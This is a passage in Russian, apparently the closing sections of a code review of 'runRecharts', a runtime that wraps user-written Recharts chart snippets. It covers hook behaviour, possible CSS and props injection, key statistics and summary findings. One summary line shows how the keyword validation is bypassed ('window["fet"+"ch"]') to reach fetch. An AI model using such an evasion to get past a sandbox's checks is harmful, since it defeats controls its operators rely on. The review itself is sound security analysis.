```

**Работает**, потому что вызывается внутри `ChartsWidgetRuntime` (во время
рендера). Хуки доступны.

**Но:** если пользовательский компонент использует `useEffect`, он выполнится
**в контексте `ChartsWidgetRuntime`**, а не как отдельный компонент. Это
может привести к неожиданному порядку хуков.

## 8.9 `ChartSurface` → `buildChartStyle()`

Функция не показана, но очевидно строит inline-style. Если она принимает
пользовательский ввод без экранирования — потенциальный CSS-инъекция.
Но `style` в React экранируется автоматически (значения, не имена свойств).

## 8.10 `applyChartRuntimeDefaults` рекурсивно обходит элементы

Не показана целиком, но если она делает `React.cloneElement` с
пользовательскими `props` без валидации — возможны проблемы.

---

# ЧАСТЬ 9. Итог

## 9.1 Ключевые числа

| Что | Значение |
|---|---|
| Размер файла | 57 519 байт |
| Шаблон runtime | ~50 КБ (97%) |
| Разрешённых пакетов | 2 (`react`, `recharts`) |
| Импортов в шаблоне | 24 (из recharts) |
| Типов графиков в `RESPONSIVE_CHART_COMPONENTS` | 11 |
| Правил валидации | 4 |
| Акцентных тем | 8 |
| Допустимых имён компонента | 3 (`Visualization`, `Chart`, `App`) |
| Состояний в runtime | 5 |

## 9.2 Главное

**1. `runRecharts` — надстройка над `runReact`.**
Не самостоятельный раннер. `yield* runReact({...})` с `disableShadcnImports: true`.

**2. Валидация — четыре правила, обходится тривиально.**
`window["fet"+"ch"]` проходит. Реальная защита — CSP.

**3. Сниппет оборачивается в 50 КБ runtime.**
Модульный код — нет. Разница огромна по размеру.

**4. `runtimeChartMeta` — недокументированное API для заголовков.**
`title`, `description`, `footer`.

**5. Три допустимых имени компонента: `Visualization`, `Chart`, `App`.**
Порядок важен — `Visualization` выигрывает.

**6. `.recharts-wrapper:focus{outline:none !important}` — проблема a11y.**

**7. Локаль жёстко `en-US`** — числа на осях не локализуются.

**8. `errorSource: "runtime"` для ошибки валидации** — неправильная
классификация.

**9. `return` после ошибки — в отличие от `run-react`, двойного
`RUN_COMPLETE` нет.**
